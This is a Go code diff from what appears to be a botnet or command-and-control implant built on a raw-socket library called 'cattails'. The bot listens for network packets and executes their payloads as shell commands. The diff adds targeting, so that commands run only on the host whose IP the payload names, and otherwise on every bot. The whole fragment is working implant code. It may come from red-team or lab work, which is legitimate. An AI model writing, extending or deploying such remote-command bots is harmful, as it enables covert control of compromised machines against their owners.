@@ -32,7 +32,7 @@ func sendHello(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.Hardware
 	}
 }
 
-func botProcessPacket(packet gopacket.Packet) {
+func botProcessPacket(packet gopacket.Packet, target bool, hostIP net.IP) {
 
 	fmt.Println("[+] Payload Received")
 
@@ -44,11 +44,22 @@ func botProcessPacket(packet gopacket.Packet) {
 	payload := strings.Split(data, " ")
 	fmt.Println("[+] PAYLOAD:", payload)
 
-	// Split the string to get the important parts
-	splitcommands := payload[1:]
-	// Rejoin string to put into a single bash command string
-	command := strings.Join(splitcommands, " ")
+	// Check if target command
+	if target {
+		if payload[1] == hostIP.String() {
+			command := strings.Join(payload[2:], " ")
+			execCommand(command)
+		}
+	} else {
+		// Split the string to get the important parts
+		// splitcommands := payload[1:]
+		// Rejoin string to put into a single bash command string
+		command := strings.Join(payload[1:], " ")
+		execCommand(command)
+	}
+}
 
+func execCommand(command string) {
 	// Only run command if we didn't just run it
 	if lastCmdRan != command {
 		fmt.Println("[+] COMMAND:", command)
@@ -64,6 +75,7 @@ func botProcessPacket(packet gopacket.Packet) {
 	} else {
 		fmt.Println("[!] Already ran command", command)
 	}
+
 }
 
 func main() {
@@ -96,9 +108,9 @@ func main() {
 	// Listen for responses
 	fmt.Println("[+] Listening")
 	for {
-		packet := cattails.BotReadPacket(readfd, vm)
+		packet, target := cattails.BotReadPacket(readfd, vm)
 		if packet != nil {
-			go botProcessPacket(packet)
+			go botProcessPacket(packet, target, src)
 		}
 	}
 
